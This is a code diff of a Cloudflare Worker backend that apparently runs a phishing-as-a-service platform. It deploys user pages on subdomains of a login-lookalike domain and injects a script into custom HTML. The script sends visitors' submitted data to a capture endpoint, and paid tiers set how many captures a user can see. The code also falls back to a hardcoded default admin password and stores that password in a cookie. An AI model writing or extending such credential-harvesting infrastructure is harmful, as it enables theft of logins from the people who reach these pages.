@@ -1,25 +1,27 @@
 /**
- * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
+ * 🚀 D-TECH GLOBAL ROUTER V7.1 (Configurable Domain)
  * LOCATION: Cloudflare Worker
  */
 
-const PASSWORD = "admin-secret-123";
 const COOKIE_NAME = "admin_session";
-const ROOT_DOMAIN = "account-login.co.za";
 
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-    const domain = url.hostname; 
+    const domain = url.hostname;
+
+    // Load Configuration from Environment Variables (with fallbacks)
+    const ROOT_DOMAIN = env.ROOT_DOMAIN || "account-login.co.za";
+    const PASSWORD = env.ADMIN_PASSWORD || "admin-secret-123";
 
     // --- CORS HANDLING ---
     if (request.method === 'OPTIONS') {
-      return handleOptions(request);
+      return handleOptions(request, env);
     }
 
     // Helper to wrap response with CORS headers
     const respond = (response) => {
-        const corsHeaders = getCorsHeaders(request);
+        const corsHeaders = getCorsHeaders(request, env);
         const newHeaders = new Headers(response.headers);
         Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));
 
@@ -38,10 +40,10 @@ export default {
 
     if (isAdminPath) {
         if (url.pathname === '/admin/login' && request.method === 'POST') {
-            return respond(await handleLogin(request));
+            return respond(await handleLogin(request, PASSWORD));
         }
 
-        const isAuth = await checkAuth(request);
+        const isAuth = await checkAuth(request, PASSWORD);
         if (!isAuth) {
             return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                 status: 401,
@@ -201,12 +203,13 @@ async function saveUser(env, code, data) {
 
 // --- HANDLERS ---
 
-function getCorsHeaders(request) {
+function getCorsHeaders(request, env) {
     const origin = request.headers.get('Origin');
-    const allowedDomain = 'https://account-login.co.za';
-    const newFrontend = 'https://new.preasx24.co.za';
+    const rootDomain = env.ROOT_DOMAIN || 'account-login.co.za';
+    const allowedDomain = `https://${rootDomain}`;
+    const frontendUrl = env.FRONTEND_URL || 'https://new.preasx24.co.za';
 
-    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.account-login.co.za'))) {
+    if (origin === allowedDomain || origin === frontendUrl || (origin && origin.endsWith('.' + rootDomain))) {
         return {
             'Access-Control-Allow-Origin': origin,
             'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
@@ -217,26 +220,26 @@ function getCorsHeaders(request) {
     return {};
 }
 
-function handleOptions(request) {
-    const headers = getCorsHeaders(request);
+function handleOptions(request, env) {
+    const headers = getCorsHeaders(request, env);
     return new Response(null, { headers: headers });
 }
 
-async function checkAuth(request) {
+async function checkAuth(request, password) {
   const cookieHeader = request.headers.get('Cookie');
   if (!cookieHeader) return false;
-  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
+  return cookieHeader.includes(`${COOKIE_NAME}=${password}`);
 }
 
-async function handleLogin(request) {
+async function handleLogin(request, password) {
     try {
         const formData = await request.formData();
-        const password = formData.get('password');
-        if (password === PASSWORD) {
+        const inputPassword = formData.get('password');
+        if (inputPassword === password) {
             return new Response(JSON.stringify({ success: true }), {
                 headers: {
                     'Content-Type': 'application/json',
-                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
+                    'Set-Cookie': `${COOKIE_NAME}=${password}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                 }
             });
         }
@@ -271,9 +274,6 @@ async function handleCaptureRequest(request, env) {
     const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;
 
     await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));
-
-    // Also track capture count for stats if we want (optional, but good for admin)
-    // For now we rely on listing keys.
 
     return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
@@ -423,7 +423,7 @@ async function handlePublicDeploy(request, env, rootDomain) {
         // --- LIMITS ---
         let limit = 1; // Free
         if (user.plan === 'basic') limit = 3;
-        if (user.plan === 'premium') limit = 10; // Downgraded from 15
+        if (user.plan === 'premium') limit = 10;
         if (user.plan === 'gold') limit = 1000; // Unlimited
 
         if (currentSites.length >= limit) {
@@ -434,10 +434,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
         const existingSub = await env.SUBDOMAINS.get(subdomain);
         if (existingSub) {
             // Check if it belongs to this user (replacing own site?)
-            // If we just deleted it above, existingSub would still be found if we didn't wait?
-            // KV is eventually consistent, but delete usually immediate for same colo.
-            // However, to be safe, if we just decided to replace it, we are fine.
-            // But if it's someone ELSE'S subdomain...
             const siteJson = JSON.parse(existingSub);
             if (siteJson.ownerCode !== uniqueCode) {
                 return jsonError("Subdomain already taken");
@@ -459,8 +455,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
             }
 
             // --- TEMPLATE USAGE LIMIT (Gold & Others) ---
-            // "Unlimited deploys but limited to 3 deploys of each template"
-            // We check how many times this specific template is used in currentSites
             const usageCount = currentSites.filter(s => s.templateName === templateName).length;
             if (usageCount >= 3) {
                 return jsonError(`You have reached the limit (3) for deploying this specific template.`);
@@ -474,16 +468,20 @@ async function handlePublicDeploy(request, env, rootDomain) {
         } else if (customHtml) {
             htmlContent = customHtml;
             shouldInject = (enableInjector === true);
-            // redirectUrl is already extracted from the body.
-            // If it's undefined or empty, we set it to null to be safe.
             if (!redirectUrl) redirectUrl = null;
         } else {
             return jsonError("Must provide a template or custom HTML");
         }
 
-        const scriptUrl = 'https://new.preasx24.co.za/injection.js';
+        const scriptUrl = env.INJECTION_SCRIPT_URL || 'https://new.preasx24.co.za/injection.js';
+        const apiUrl = env.API_URL || 'https://calm-bread-1d99.testdx24.workers.dev';
+        const captureUrl = `${apiUrl}/api/capture`;
+
         if (shouldInject) {
             let injectionBlock = `<script>window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};</script>`;
+
+            // Inject dynamic capture URL
+            injectionBlock += `<script>window.CAPTURE_URL = ${JSON.stringify(captureUrl)};</script>`;
 
             if (redirectUrl) {
                 injectionBlock += `<script>window.REDIRECT_URL = ${JSON.stringify(redirectUrl)};</script>`;
@@ -509,7 +507,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
         }));
 
         // 5. Update Code Map
-        // We store templateName here too for faster counting without fetching site content
         currentSites.push({
             subdomain,
             created: Date.now(),
@@ -535,7 +532,6 @@ async function handleGetPublicCaptures(request, env) {
 
     // Check if locked
     if (user.status === 'locked' || user.status === 'banned') {
-         // Return specialized error or just success:false with status
          return new Response(JSON.stringify({
              success: false,
              error: "Account Locked",
@@ -554,21 +550,19 @@ async function handleGetPublicCaptures(request, env) {
             sites = codeMap.sites;
             siteCount = sites.length;
         } else if (codeMap.subdomain) {
-            // Legacy
             sites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
             siteCount = 1;
         }
     }
 
     const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
-    // Sort latest first
     const keys = list.keys.reverse();
     const totalCount = keys.length;
 
     // Apply Limits
     let limit = 5; // Free
     if (user.plan === 'basic') limit = 15;
-    if (user.plan === 'premium') limit = 250; // Downgraded
+    if (user.plan === 'premium') limit = 250;
     if (user.plan === 'gold') limit = 100000; // Unlimited
 
     const visibleKeys = keys.slice(0, limit);
@@ -657,26 +651,20 @@ async function handlePaymentSubmit(request, env) {
         const user = await getUser(env, uniqueCode);
         if (user.status === 'banned') return jsonError("Account is permanently banned.");
 
-        const requestedPlan = body.plan || 'premium'; // Default to premium if not specified
+        const requestedPlan = body.plan || 'premium';
         let provisionalPlan = requestedPlan;
         let pendingStatus = null;
 
-        // Gold Special Logic: Give Premium immediately, mark as Pending Gold
         if (requestedPlan === 'gold') {
-            provisionalPlan = 'premium'; // Provisional access
+            provisionalPlan = 'premium';
             pendingStatus = 'gold';
-            user.pendingPlan = 'gold'; // Store pending status
+            user.pendingPlan = 'gold';
         } else {
-             // For Basic/Premium, give immediate access (as per existing logic)
-             // Or should we set them pending too? The prompt implies only Gold is strict pending.
-             // "unlike the other plan payments where the users gets the access immediately for gold thy have to wait"
-             // So others are immediate.
              provisionalPlan = requestedPlan;
-             if (user.pendingPlan) delete user.pendingPlan; // Clear if downgrading/changing
+             if (user.pendingPlan) delete user.pendingPlan;
         }
 
         user.plan = provisionalPlan;
-        // Do NOT update expiry yet (wait for admin verification)
 
         await saveUser(env, uniqueCode, user);
 
@@ -687,7 +675,7 @@ async function handlePaymentSubmit(request, env) {
             uniqueCode,
             voucherType,
             voucherCode,
-            plan: requestedPlan, // The plan they WANT (e.g. Gold)
+            plan: requestedPlan,
             submitted: Date.now(),
             status: 'pending'
         };
@@ -713,7 +701,6 @@ async function handleGetVouchers(env) {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
         return val;
     }));
-    // Filter only pending?
     const pending = vouchers.filter(v => v.status === 'pending');
     return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
 }
@@ -721,7 +708,7 @@ async function handleGetVouchers(env) {
 async function handleVoucherAction(request, env) {
     try {
         const body = await request.json();
-        const { voucherId, action, reason } = body; // action: 'approve' | 'decline'
+        const { voucherId, action, reason } = body;
 
         const voucherKey = `voucher_queue::${voucherId}`;
         const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
@@ -730,33 +717,28 @@ async function handleVoucherAction(request, env) {
         const user = await getUser(env, voucher.uniqueCode);
 
         if (action === 'approve') {
-            // Solidify Plan
             const now = Date.now();
             let currentExpiry = user.expiry || now;
-            if (currentExpiry < now) currentExpiry = now; // If expired, start from now
+            if (currentExpiry < now) currentExpiry = now;
 
-            // If pending gold, upgrade now
             if (user.pendingPlan === 'gold' && voucher.plan === 'gold') {
                 user.plan = 'gold';
                 delete user.pendingPlan;
             } else {
-                // Ensure plan matches voucher (in case of drift)
                 user.plan = voucher.plan;
             }
 
-            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000); // Add 30 Days (Stackable)
+            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000);
             user.lastPaymentDate = now;
-            user.status = 'active'; // Ensure active
+            user.status = 'active';
 
-            // Delete from queue
             await env.SUBDOMAINS.delete(voucherKey);
 
         } else if (action === 'decline') {
-            // Revert Plan
             user.plan = 'free';
-            if (user.pendingPlan) delete user.pendingPlan; // Clear pending
+            if (user.pendingPlan) delete user.pendingPlan;
 
-            user.status = 'locked'; // "Serious Red Warning"
+            user.status = 'locked';
             user.strikes = (user.strikes || 0) + 1;
             user.lockReason = reason || "Invalid Voucher";
 
@@ -776,7 +758,6 @@ async function handleVoucherAction(request, env) {
 }
 
 async function handleGetUsers(env) {
-    // This is expensive if many users. For now, we list `user::` prefix.
     const list = await env.SUBDOMAINS.list({ prefix: "user::" });
     const users = await Promise.all(list.keys.map(async k => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
